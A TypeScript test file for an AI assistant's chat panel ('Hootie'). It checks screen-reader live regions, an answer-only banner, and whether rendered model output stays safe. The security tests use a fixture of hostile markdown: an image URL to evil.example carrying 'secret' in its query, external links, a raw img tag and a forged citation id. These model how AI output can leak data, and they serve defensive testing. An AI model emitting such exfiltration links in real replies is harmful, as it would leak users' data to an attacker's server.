/**
 * H1 — the panel's live regions (AC-H1-09) and the answer-only banner
 * (AC-H1-11).
 *
 * A screen reader must not read the answer token by token: the feed is not a
 * live region. Status lines ("Read board …") and one final line ("Answer
 * ready…") go to a separate polite role=status region.
 */
import { describe, it, expect } from "vitest";
import { readFileSync } from "fs";
import { renderToStaticMarkup } from "react-dom/server";
import { AnswerBubble, HootieLiveRegion } from "./HootiePanel";
import { answerReadyLine, answerOnlyBanner } from "@/lib/hootie-panel";

const noop = () => {};
const bubble = (message: Record<string, unknown>) =>
  renderToStaticMarkup(
    <AnswerBubble
      name="Hootie"
      nestId="n1"
      onOpenNode={noop}
      message={{ id: 1, role: "assistant", content: "", ...message } as any}
    />,
  );

describe("Hootie live regions (AC-H1-09)", () => {
  it("a status line in the feed is not announced from the feed", () => {
    const html = bubble({ pending: true, status: "Read board “November board”" });
    expect(html).toContain("Read board “November board”");
    expect(html).not.toContain("aria-live");
    expect(html).not.toContain('role="status"');
  });

  it("streaming answer tokens are not inside any live region", () => {
    const html = bubble({ pending: true, content: "Four items are blo" });
    expect(html).toContain("Four items are blo");
    expect(html).not.toContain("aria-live");
  });

  it("the separate region is polite role=status and carries one line", () => {
    const html = renderToStaticMarkup(<HootieLiveRegion line="Read the boards" />);
    expect(html).toMatch(/role="status"/);
    expect(html).toMatch(/aria-live="polite"/);
    expect(html).toContain("Read the boards");
  });

  it("the panel has exactly one live region, and it is that one", () => {
    const src = readFileSync(new URL("./HootiePanel.tsx", import.meta.url), "utf8");
    expect(src.match(/aria-live/g)).toHaveLength(1);
    expect(src).toMatch(/<HootieLiveRegion line=\{/);
  });

  it("announces one final line when the answer is ready", () => {
    expect(answerReadyLine({ actions: 0, proposals: 0, answerOnly: false })).toBe("Answer ready.");
    expect(answerReadyLine({ actions: 1, proposals: 1, answerOnly: false })).toBe("Answer ready, 1 action and 1 proposal.");
    expect(answerReadyLine({ actions: 2, proposals: 3, answerOnly: false })).toBe("Answer ready, 2 actions and 3 proposals.");
    expect(answerReadyLine({ actions: 0, proposals: 0, answerOnly: true })).toBe("Answer ready, answer-only mode.");
  });
});

describe("answer-only banner (AC-H1-11)", () => {
  it("shows the fixed banner when the model connection refused tools", () => {
    const html = bubble({ content: "From what I have.", answerOnly: "tools_refused" });
    expect(html).toContain('data-testid="hootie-answer-only"');
    // renderToStaticMarkup escapes the apostrophes; the words are the fixed copy.
    expect(html).toContain(answerOnlyBanner("Hootie").replace(/'/g, "&#x27;"));
  });

  it("no banner on a normal answer, or when a single call was refused", () => {
    expect(bubble({ content: "Hi." })).not.toContain("hootie-answer-only");
    expect(bubble({ content: "Hi.", answerOnly: "rejected_call" })).not.toContain("hootie-answer-only");
  });

  it("the banner is fixed copy naming the assistant", () => {
    expect(answerOnlyBanner("Hootie")).toBe(
      "Answer-only mode. This model connection can't use tools right now, so Hootie answered from what it found without opening anything or looking again. An admin can switch models in Settings.",
    );
  });
});

describe("answer rendering — nothing fetched, nothing clickable but resolved chips (security r1 F2)", () => {
  const hub = { id: "nodes/hub", title: "Hub", tags: [], type: "document" };
  const html = bubble({
    content:
      "Done. ![x](https://evil.example/p?d=secret) see [here](https://evil.example/a) and https://evil.example/raw " +
      "and [b](#cite:nodes%2Fsecret) and [[Hub]] and <img src=https://evil.example/i>",
    cited: [hub],
  });

  it("renders no image, so nothing is fetched", () => {
    expect(html).not.toMatch(/<img/i);
  });

  it("renders no external link", () => {
    expect(html).not.toMatch(/<a\s/i);
    expect(html).not.toContain('href="https://evil.example');
  });

  it("a model-written #cite: id the server didn't resolve is not a chip", () => {
    const chips = html.match(/data-testid="hootie-citation"/g) ?? [];
    expect(chips).toHaveLength(1);
    expect(html).not.toContain("nodes/secret");
  });

  it("a resolved [[link]] is still a chip", () => {
    expect(html).toMatch(/data-testid="hootie-citation"[^>]*>Hub</);
  });
});
